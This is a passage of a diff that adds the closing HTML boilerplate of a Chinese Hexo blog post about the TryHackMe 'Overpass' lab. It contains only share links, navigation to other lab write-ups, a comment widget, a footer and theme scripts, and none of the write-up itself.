+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/05/05/Overpass/&title=《TryHackMe - Overpass 靶场实战》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/05/05/Overpass/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《TryHackMe - Overpass 靶场实战》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/05/05/Overpass/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/05/05/Overpass/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/08/04/Armageddon/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Hackthebox - Armageddon 靶场实战</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2021/11/13/Kioptrix/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Vulnhub - Kioptrix Level 1 靶场实战</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: '',
+          clientSecret: '',
+          repo: '',
+          owner: '',
+          admin: [''],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/false" alt="打赏二维码">
+        </div>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/05/05/Overpass/&title=《TryHackMe - Overpass 靶场实战》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/05/05/Overpass/&title=《TryHackMe - Overpass 靶场实战》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/05/05/Overpass/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《TryHackMe - Overpass 靶场实战》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/05/05/Overpass/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/05/05/Overpass/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACI0lEQVR42u3aOY7DMAwF0Nz/0h5g2iDOJykXkZ6rwFmsp4IRl9crvq7/6/3O+/3k3U+fSb41ujAwMH6Wcd1e74xPr+8XV+Xla8PAwDiHUf25+8fkv1Ddpo/3MTAwMILjWg+AgYGB8UTAzd9NwnH+FAwMDIz8kXkRLS+c5cF6QS6OgYHxg4z5Y557/WB/AwMD40cYV/GqHul6ZbXyqjAwMLZm3LchqwW46vExeXqe1mJgYJzAmIxNzJPe3vAZBgbGaYz8TnW0Yn6gjGAYGBibMpJQmx/jnhjCiFJfDAyMwxjVYFctzFUHv6ItxsDAOIxR7QzmmLUJc/S/gYGBsQWjN+hQPSzOE+Co/YCBgbEpI29V9pZbLu7He4+BgXEyo3ekS+5UQ3khxcXAwDiG0UtZ56FzwfgFBgbG1oxe+b46YDEpyRX+ADAwMDZlTEr298vKP5m3Ub/0NzAwMA5gzANrvujqOMWX5BYDA2NrRj4K1iuNTYYq8jsYGBh7M6Jxq6BYliyuV6qLBkEwMDAOYFTbilVqXtxvtg0wMDC2Zqwqn60a8+ptKAYGxt6Mq3hNinS9g2b0LgYGxtaMaqCsNgbyYY58U6phGgMDYw/GvPXYGwVLtikP9BgYGCcwJkF2cU91kotjYGAcz7hPR3up5rKiHgYGBkYcKHsHwV4K3TwaYmBg/CwjL5mtTVPz1sKXp2BgYGzN6CWQqxaRbEpvgAwDA2MLxh8a9mC+85d4XQAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
